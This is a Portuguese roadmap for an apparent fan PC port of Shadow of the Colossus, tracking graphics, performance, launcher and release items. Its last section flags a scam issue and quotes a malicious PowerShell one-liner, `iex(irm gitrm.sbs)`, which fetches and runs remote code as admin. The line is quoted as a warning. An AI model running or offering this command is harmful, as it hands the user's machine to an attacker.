| 4b | Streaming de texturas desligado sem querer desde a v0.0.13 | ✅ | Opção "Texturas em alta qualidade" nos Ajustes rápidos, **ligada por padrão** (`SOTC_LOD_LINGER=1`: os bancos usados desde o último relatório contam como amostrados). Comparação na árvore da abertura: folhas borradas → nítidas. Testes anteriores equivalentes: 10+15 min normal e 7,5 min Pro sem queda; carregar save com ela ligada ainda sem teste automático. |
| 5 | Queda na intro final | ✅ | Ver 0.20: jogo zerado do início ao fim (20/10). |
| 6 | Release v0.58 | ✅ | **Publicada em 19/10** (tag `v0.58` = `0ac9252`, SotC-PC.zip 84 MB, Latest). Releases públicas: 0.58, 0.57, 0.56. O rascunho antigo 0.58-rc1 (AMD preview, não público) ficou. |

## Fase 2 — Modo 60 FPS

| # | Item | Estado | Notas |
|---|---|---|---|
| 7 | Física/tempo no dobro: parede do 2º colosso (#120), colossos voando (#100), queda na ponte (#63) | 🔧 | Alternativa pronta (0.7): jogo a 30 + geração de quadros = 60 na tela sem mexer na física. O modo 60 FPS nativo continua com os defeitos. |

## Fase 3 — AMD e outras GPUs

| # | Item | Estado | Notas |
|---|---|---|---|
| 8 | AMD (#122, #87, #86, #82, #43), GTX 1060/1070 (#102, #68), Intel Arc (#16) | 🔧 | #98, #81 (partes) e xeodeo integrados; falta teste em AMD/Intel reais (pedir a jogadores). GTX 10xx sem trabalho ainda. |

## Fase 4 — Desempenho

| # | Item | Estado | Notas |
|---|---|---|---|
| 9 | Processador de comandos (meta 40–60 FPS estáveis) | 🔧 | #59/#83/#103 integradas (+10% no demo); falta 0.5 (#69). |
| 10 | FPS baixo em PCs fortes (#129), templo (#14) | ⏳ | |

## Fase 5 — Extras

| # | Item | Estado | Notas |
|---|---|---|---|
| 11 | Pré-compilar shaders (#124), auto-update (#136), versão sem AVX2 (#70, #89, #88) | ⏳ | #83 já lê os caches em paralelo (50 s → 0,9 s) e compila pipelines em segundo plano. |

## Fase 6 — Lançador e janela (pedidos do usuário, 19/10)

| # | Item | Estado | Notas |
|---|---|---|---|
| 12 | Idiomas do lançador: espanhol, chinês (simplificado), coreano, russo | ✅ | `ac18022`. 224 textos por idioma em `launcher/sotc_i18n.py` (procurados pelo texto em português; o que faltar sai em inglês); fonte Microsoft YaHei UI / Malgun Gothic para chinês/coreano; conferido na tela. |
| 13 | Opção de FPS: 30 / 60 / ilimitado | ✅ | `3b433bd`. 60 = sem o limite do jogo, no máximo 1 quadro a cada 2 vblanks de 120 Hz (`SOTC_FPS_LIMIT`); demo nunca acima de 60,0. |
| 14 | Ícone do jogo na janela, versão e FPS no título | ✅ | `d7bb081`. Ícone tirado do `icon0.png` do dump do jogador (nada da Sony no pacote); título "SHADOW OF THE COLOSSUS™ · v01.01 · 60 FPS". |
| 15 | DLSS-G (RTX 40/50) no pacote | ✅ | `0ab2ff7`. Runtime oficial NVIDIA Streamline 2.14.16 (11 MB, assinaturas verificadas) + licenças em `bin/licenses-nvidia`, fora do git (`../SotC-deps`). Na RTX 2060 a DLSS-G é recusada e a FSR 3 assume. Não testada em RTX 40/50 (outros projetos já testaram numa 4080). |
| 16 | Overlay F10 e mensagens F7/F8 no idioma do lançador | ✅ | `9656fa4` (os textos do fork de geração de quadros estavam em francês). |
| 17 | Widescreen / ultrawide (16:10, 21:9, 32:9, Hor+) | ✅ | PR #54 (tabnul), `72d2a69`. Testado em 2560x1080: imagem mais larga, sem esticar, sem erros. |
| 18 | Ícones de botões Xbox no jogo (opção PlayStation / Xbox) | ✅ | Mecanismo de troca de texturas do xeodeo (`5cfd8ea`); 12 ícones desenhados do zero (`tools/make_button_icons.py`, `glyphs/xbox`): A B X Y, RB, LT/RT, LS/RS, Menu, View. Opção em Controles no lançador. Conferido no menu: B = retroceder, A = confirmar. |

| 19 | Modo PS4 Pro nos Ajustes rápidos | ✅ | `c407620`. |
| 20 | Idioma na primeira tela do lançador | ✅ | `8508a33`. Seletor 🌐 no canto da tela de boas-vindas; o lançador reabre no idioma escolhido. |
| 21 | Imagem de cada save na lista (como no PS4 / shadPS4) | ✅ | O `icon0.png` de cada save à esquerda do título, detalhes e data. |

| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. Desde 0.44: translúcida em engasgos curtos, opaca só após 3 s sem quadro. |

| 23 | Ícone próprio da janela do jogo (menino com a espada; ou o do jogo, ou imagem do jogador) | ✅ | `83ecb1c`. |
| 24 | Release v0.58.1 | ✅ | Publicada em 19/10 (texturas em alta qualidade + ícone da janela). Releases públicas: 0.58.1, 0.58, 0.57 (0.56 removida; tag mantida). |

## Fora do roteiro

- Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
